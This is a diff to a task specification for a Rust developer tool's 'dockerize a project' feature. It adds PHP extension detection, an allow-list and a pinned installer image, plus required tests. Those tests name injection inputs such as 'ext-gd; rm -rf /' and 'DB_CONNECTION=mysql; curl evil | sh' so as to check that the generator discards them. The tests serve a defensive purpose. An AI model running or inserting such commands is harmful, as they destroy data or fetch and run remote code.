@@ -12,7 +12,7 @@ Six tasks. **Do them in this order, one per commit.** Each task is independent; 
 | 2 | `olsc docker …` CLI | Low | `crates/ols-cli` |
 | 3 | Diagnostics warnings | Medium (startup rule) | `diagnostics.rs` |
 | 4 | Site bundles + Docker | Medium | `sitebundle.rs` |
-| 5 | Dockerize a project | Medium | new `docker/dockerize.rs`, UI, MCP |
+| 5 | Dockerize a project (incl. PHP extensions) | Medium–high | new `docker/dockerize.rs`, UI, MCP |
 | 6 | Screenshots for new tabs | Low | `assets/`, `website/`, `README.md`, `index.html` |
 
 ---
@@ -225,6 +225,8 @@ pub struct DockerizePlan {
   pub dockerfile_path: String, pub compose_path: String,
   pub existing: Vec<String>,   // files that already exist and will NOT be overwritten
   pub port: u16, pub notes: Vec<String>,   // human explanations
+  pub php_extensions: Vec<String>,   // PHP only: extensions that WILL be installed (empty for other kinds)
+  pub unknown_extensions: Vec<String>, // PHP only: needed but not on the allow-list; listed as a note, never installed
 }
 pub fn plan(project_dir: &Path, project_type: Option<&str>, is_free: &dyn Fn(u16)->bool) -> Result<DockerizePlan, CoreError>
 pub fn write(plan: &DockerizePlan, overwrite_compose: bool) -> Result<(), CoreError>
@@ -233,13 +235,50 @@ Detection → template (all values come from a **closed set**; never paste file 
 | Kind | Detect | Base image (tag pinned) | Port | Command |
 |---|---|---|---|---|
 | node | `package.json` | `node:<major>-alpine` where major from `.nvmrc` / `engines.node` (digits only, clamp 18..24, default 22) | 3000 | `npm run dev` if `scripts.dev`, else `npm start` if `scripts.start`, else add a note and use `node .` |
-| php | `composer.json` | `php:<8.x>-apache` where x from `require.php` (`^8.3` → 8.3; unknown → 8.3) | 80 | Apache; if `artisan` exists set `DocumentRoot` to `/var/www/html/public` via `APACHE_DOCUMENT_ROOT` env + `sed` lines in Dockerfile |
+| php | `composer.json` | `php:<8.x>-apache` where x from `require.php` (`^8.3` → 8.3; unknown → 8.3) | 80 | Apache; if `artisan` exists set `DocumentRoot` to `/var/www/html/public` via `APACHE_DOCUMENT_ROOT` env + `sed` lines in Dockerfile; **plus the PHP extensions below** |
 | python | `requirements.txt` or `pyproject.toml` | `python:3.12-slim` | 8000 | if `manage.py` ⇒ `python manage.py runserver 0.0.0.0:8000`; else if `main.py` has `FastAPI` text ⇒ `uvicorn main:app --host 0.0.0.0 --port 8000`; else a note, command `python main.py` |
 | static | `index.html` | `nginx:1.28-alpine` | 80 | nginx |
 - Compose: one service named after the folder slug, `build: .`, `ports: ["127.0.0.1:<free>:<port>"]` (free port found like the builder: start at the default, `+0..200`), `volumes: ["./:/app"]` for node/python dev (not for php/static: Apache/nginx serve the copied files), `restart: unless-stopped`, label `dev.ols.managed: "true"`, `extra_hosts: host.docker.internal:host-gateway`. Validate the generated compose with `compose::check_text` (must be `ok`) before returning — return an error if not.
 - **Existing files:** if `Dockerfile` exists keep it (`dockerfile: None`, listed in `existing`); if a compose file exists (any of the 4 names) refuse unless `overwrite_compose` and then back it up through `compose::save_file`.
 - Also write a `.dockerignore` (only if absent) with `node_modules`, `.git`, `vendor`, `.env`, `__pycache__`.
 - Read at most the first 64 KB of each detected file; JSON/TOML parse failures ⇒ a note, not an error.
+
+### PHP extensions (the official `php` images ship almost none — MUST be handled)
+Without this a Laravel/WordPress project builds fine and then fails at runtime with "could not find driver". Official images include only: Core, ctype, curl, date, dom, fileinfo, filter, ftp, hash, iconv, json, libxml, mbstring, mysqlnd, openssl, pcre, PDO, pdo_sqlite, Phar, posix, readline, Reflection, session, SimpleXML, sodium, SPL, sqlite3, standard, tokenizer, xml, xmlreader, xmlwriter, zlib. Everything else must be installed.
+
+**1. Collect the needed extension names** (`fn needed_php_extensions(dir) -> BTreeSet<String>`), from these sources only, each read at most 64 KB:
+- `composer.json` → keys of `require` and `require-dev` that start with `ext-` (strip the prefix, lowercase);
+- `composer.lock` → each package's `require` keys starting with `ext-` (same treatment; this catches dependencies' needs);
+- `.env.example`, then `.env` only if the first is absent → `DB_CONNECTION=` value (`mysql`/`mariadb` ⇒ `pdo_mysql`, `pgsql` ⇒ `pdo_pgsql`, `sqlsrv` ⇒ `pdo_sqlsrv`), `CACHE_DRIVER|CACHE_STORE|SESSION_DRIVER|QUEUE_CONNECTION=redis` ⇒ `redis`. **Parse only the `KEY=value` pairs you look for; never copy a value anywhere except through the mapping.**
+- project kind defaults: `artisan` exists (Laravel) ⇒ `pdo_mysql`, `zip`, `bcmath`, `intl`, `gd`; `wp-config.php`/`wp-content` exists (WordPress) ⇒ `mysqli`, `gd`, `zip`, `intl`, `exif`, `imagick`, `opcache`.
+Also OLS knows the PHP extensions it enables for the project's own PHP (see the PHP extensions dialog / `crates/ols-core/src/php.rs` and `detection.rs`); **reuse that list only if it is a plain set of names** — `grep -n "extension" crates/ols-core/src/php.rs` first, and if reusing it is not obvious, skip it and say so in the commit body.
+
+**2. Keep only names on an allow-list.** Hard-code this closed set in `dockerize.rs` as a `const`:
+`bcmath, calendar, exif, gd, gettext, imagick, intl, mysqli, opcache, pcntl, pdo_mysql, pdo_pgsql, pgsql, redis, soap, sockets, sysvsem, xsl, zip, apcu, memcached, mongodb, xdebug` (extend only with names that exist in the installer's supported list).
+- Names already built into the image (the list above) are dropped silently.
+- A needed name **not** on the allow-list goes into `unknown_extensions` and produces a note: `"Needs the PHP extension X, which OLS cannot install automatically: add it to the Dockerfile yourself."` It is never written into any file. Names like `oci8`, `sqlsrv`, `pdo_sqlsrv`, `ibm_db2` always land here (they need vendor downloads).
+
+**3. Emit the install step.** Add to the PHP Dockerfile, after `FROM`, exactly:
+```
+COPY --from=ghcr.io/mlocati/php-extension-installer:<PINNED> /usr/bin/install-php-extensions /usr/local/bin/
+RUN install-php-extensions <names sorted, space separated>
+```
+- `<PINNED>`: the installer is distributed as an image; use a **fixed version tag** (e.g. `2.7`) taken from the installer's releases page, **not** `latest`. **A human must confirm this tag exists and ideally add `@sha256:<digest>`** (Docker verifies each layer's SHA-256 when pulling; AGENTS.md "verify SHA-256" is satisfied by the digest pin). Put the tag in one `const PHP_EXT_INSTALLER: &str` so it is a one-line change, and add a note to the commit body asking the maintainer to verify it. **Do not invent a digest.**
+- Emit these two lines only when the final `php_extensions` list is non-empty. Then also set `composer` if `composer.json` exists: `COPY --from=composer:2 /usr/bin/composer /usr/bin/composer` (fixed tag `composer:2`).
+
+**4. Show it.** The preview dialog lists "PHP extensions that will be installed: …" and "Needs manual setup: …" (from `unknown_extensions`) above the Dockerfile. If the list was inferred rather than declared (only from `.env`/project kind), say "guessed from your .env / project type — check it".
+
+**5. Tests (required, in `dockerize.rs`):**
+- `composer.json` with `ext-gd`, `ext-intl` ⇒ both appear, sorted, in the `RUN install-php-extensions` line.
+- `composer.lock` dependency requiring `ext-zip` ⇒ included.
+- `.env.example` with `DB_CONNECTION=mysql` ⇒ `pdo_mysql`; `DB_CONNECTION=sqlsrv` ⇒ `unknown_extensions` contains `pdo_sqlsrv`, **not** in the Dockerfile.
+- Laravel (`artisan` present) ⇒ default set present.
+- built-in names (`ext-mbstring`, `ext-json`) ⇒ dropped, no install line when nothing else is needed.
+- **Hostile input:** `composer.json` requiring `ext-gd; rm -rf /` and `.env.example` with `DB_CONNECTION=mysql; curl evil | sh` ⇒ output contains neither `rm -rf` nor `curl evil`; the first goes to `unknown_extensions` (it fails the allow-list), the second maps to nothing.
+- No PHP extensions needed ⇒ the Dockerfile has **no** `install-php-extensions` line and no `ghcr.io` reference.
+- Generated Dockerfile for PHP never contains `latest`.
+
+**Limits to state in the docs and notes:** extensions the project uses without declaring them (not in composer.json/lock, not implied by `.env.example`) cannot be detected; extensions that need vendor downloads are reported, not installed.
 
 ### Commands
 `PlanDockerize { project_id }` → `R::DockerizePlan{plan}`; `CreateDockerize { project_id, overwrite_compose: bool }` → `R::DockerizePlan{plan}` (writes). `plan_` is read-only on the HTTP API automatically; `create_dockerize` is **not** added to `OPERATE` (UI/MCP-with-dry-run only). After writing, `i.set_docker_connected(compose_path, true)` like the builder does.
@@ -254,10 +293,10 @@ In `ComposeTab.tsx` next to **New compose file** add **From a project…** → d
 1. `dockerize.rs` + unit tests with temp dirs: node (with `.nvmrc` 20, `scripts.dev`), php (`composer.json` `^8.2`, with and without `artisan`), python (`manage.py`; FastAPI main.py), static; existing Dockerfile kept; existing compose refused then backed-up when allowed; generated compose passes `check_text`; hostile `package.json` (`scripts.dev` containing `"; rm -rf /"`) — the command in the Dockerfile must be one of the fixed strings, never the script's text (assert the output doesn't contain `rm -rf`).
 2. Commands, dispatch, TS, MCP + test, `api.rs` (no change).
 3. UI dialog + button.
-4. Docs: all of §0.1 plus `data_models.txt` (`DockerizePlan`), `api_reference.md`, `docs/MCP.md`, README Docker bullet, release notes ("Generate a Dockerfile and compose file for a project"), CHANGELOG, manuals.
+4. Docs: all of §0.1 plus `data_models.txt` (`DockerizePlan` incl. `php_extensions` / `unknown_extensions`), `api_reference.md`, `docs/MCP.md`, README Docker bullet, release notes ("Generate a Dockerfile and compose file for a project, including the PHP extensions it needs"), CHANGELOG, manuals; `full_documentation.md` must state the two limits above.
 
-**Done when:** gate passes; every kind has a test; hostile-input test passes.
-**Do NOT:** execute project scripts; copy text from project files into generated files except the closed-set values above (version digits, script *names* chosen from the fixed list); overwrite anything without `overwrite_compose`; run `docker build` automatically.
+**Done when:** gate passes; every kind has a test; both hostile-input tests pass; a Laravel project with `DB_CONNECTION=mysql` produces a Dockerfile that installs `pdo_mysql`; the installer image tag is a pinned version (not `latest`) and the commit body asks the maintainer to verify it.
+**Do NOT:** execute project scripts; copy text from project files into generated files except the closed-set values above (version digits, script *names* and PHP extension names chosen from the fixed lists); overwrite anything without `overwrite_compose`; run `docker build` automatically; use `latest` for any image; write an invented digest; download anything yourself (the installer arrives only through Docker pulling the pinned image).
 
 ---
 
